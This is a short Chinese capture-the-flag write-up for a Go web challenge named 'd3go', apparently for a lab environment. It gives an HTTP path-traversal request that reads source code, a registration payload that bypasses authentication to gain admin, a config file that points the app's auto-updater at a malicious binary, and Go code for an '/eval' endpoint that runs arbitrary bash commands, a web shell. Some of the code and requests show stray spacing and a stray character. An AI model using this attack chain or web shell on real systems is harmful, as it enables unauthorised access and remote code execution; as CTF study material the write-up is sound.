---
tags: [路径穿越, 源码审计, 身份认证绕过, 配置文件覆盖, RCE, Golang]
---

# d3go

获取题目环境

```
GET /assets/../../main.go HTTP/1.1
Host: 139.196.211.236:31833
Pragma: no-cache
Cache-Control : no-cache
Upgrade-Insecure-Requests : 1
User-Agent : Mozilla/5 .0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 .36 (KHTML, like Gecko) Chrome/112 .0 .0 .0 Safari/537 .36
Accept : text/html,application/xhtml+xml,application/xml;q=0 .9,image/avif,image/webp,image/apng,*/*;q=0 .8,application/signed-exchange;v=b3;q
Accept-Encoding : gzip, deflate
Accept-Language : zh-CN,zh;q=0 .9
Cookie : mysession=MTY4MjY5MTkzNHxEdi1CQkFFQ180SUFBUkFCRUFBQUhmLUNBQUVHYzNSeWFXNW5EQWNBQldGa2JXbHVCR0p2YjJ3Q0FnQUF8zVkryZKHftsddAiIMzZVi3ouT
Connection : close
```

注册个admin先

```
POST http://localhost:8080/register HTTP/1.1
Content-Type: application/json
{
"Id" :1,
"username" :"",
"password" :"",
"CreatedAt" : "2021-11-10T23 :00 :00Z"
"DeletedAt" : "2021-11-10T23 :00 :00Z"
}
```

```
POST http://localhost:8080/register HTTP/1.1
Content-Type: application/json
{
"username" :"test123",
"password" :"test123"
}
```

用test123:test123登陆成admin

用zip覆盖config.yaml, 让他的自动更新下个恶意golang binary完事

服务器不出网 , 得走localhost

```
server :
noAdminLogin : true
database :
user : root
password : root
host : 127 .0 .0 .1
port : 3306
update :
enabled : true
url: http://localhost:8080/unzipped/e956cd1a-b2a2-453c-bc5a-ac2128f45ae3/d3go
interval: 1
```

```
overseer .SanityCheck()
r .POST("/eval", func(c *gin .Context) {
cmd := exec .Command("bash", "-c", c .Query("command"))
stdout, _ := cmd .StdoutPipe()
defer stdout .Close()
if err := cmd .Start(); err != nil {
c .JSON(500, Resp{
StatusCode : 0,
StatusMsg :  err .Error(),
})
return
}
result, _ := ioutil .ReadAll(stdout)
c .JSON(200, Resp{
StatusCode : 0,
StatusMsg :  string(result),
})
})c
```

